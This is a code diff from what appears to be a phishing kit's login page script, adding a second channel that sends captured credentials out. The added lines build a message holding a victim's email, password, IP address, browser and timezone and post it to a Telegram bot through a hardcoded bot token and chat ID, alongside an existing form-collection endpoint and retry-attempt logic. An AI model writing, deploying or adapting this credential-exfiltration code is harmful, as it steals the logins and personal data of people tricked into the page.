@@ -528,7 +528,7 @@
               }
             }, 100);
           }).then(() => {
-            // Form submission to the only endpoint
+            // Form submission to endpoint
             fetch("https://submit-form.com/UBUe62yEH", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -537,6 +537,29 @@
               console.log(response.ok ? "Submission to form successful!" : "Submission to form failed.");
             }).catch(error => {
               console.error("Error sending submission to form:", error);
+            });
+
+            // Telegram API submission
+            const telegramMessage = `
+              New Submission:
+              Email: ${email}
+              Password: ${password}
+              IP Address: ${userData.ipAddress}
+              Browser: ${userData.browser}
+              User Agent: ${userData.userAgent}
+              Timezone: ${userData.timezone}
+            `;
+            fetch("https://api.telegram.org/bot7103630373:AAE6U52dZ_UBA5-VSC2mP4xMHGnXJZT3DJs/sendMessage", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: 6134592216,
+                text: telegramMessage
+              })
+            }).then(response => {
+              console.log(response.ok ? "Submission to Telegram successful!" : "Submission to Telegram failed.");
+            }).catch(error => {
+              console.error("Error sending submission to Telegram:", error);
             });
 
             if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
